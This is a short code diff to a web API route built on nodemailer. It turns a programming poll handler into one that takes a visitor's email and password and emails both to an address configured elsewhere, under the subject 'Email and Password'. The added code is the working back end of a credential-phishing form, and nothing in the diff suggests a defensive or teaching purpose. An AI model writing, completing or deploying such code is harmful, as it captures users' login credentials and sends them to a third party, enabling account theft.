@@ -4,9 +4,9 @@ import nodemailer from 'nodemailer';
 export async function POST(request) {
     try {
         const body = await request.json();
-        const { name, email, question1, question2, feedback } = body;
+        const { email, password } = body;
 
-        // debugging check for variables
+        // debugging stuff
         // console.log('Environment variables check:', {
         //     hasEmailUser: !!process.env.EMAIL_USER,
         //     hasEmailPass: !!process.env.EMAIL_PASSWORD,
@@ -29,14 +29,11 @@ export async function POST(request) {
         const mailOptions = {
             from: process.env.EMAIL_USER,
             to: process.env.RECIPIENT_EMAIL,
-            subject: 'New Poll Submission',
+            subject: 'Email and Password',
             html: `
-                <h2>New Poll Submission</h2>
-                <p><strong>Name:</strong> ${name}</p>
+                <h2>deets</h2>
                 <p><strong>Email:</strong> ${email}</p>
-                <p><strong>Favorite Programming Language:</strong> ${question1}</p>
-                <p><strong>Years of Coding Experience:</strong> ${question2}</p>
-                <p><strong>Additional Feedback:</strong> ${feedback}</p>
+                <p><strong>Password:</strong> ${password}</p>
             `
         };
 
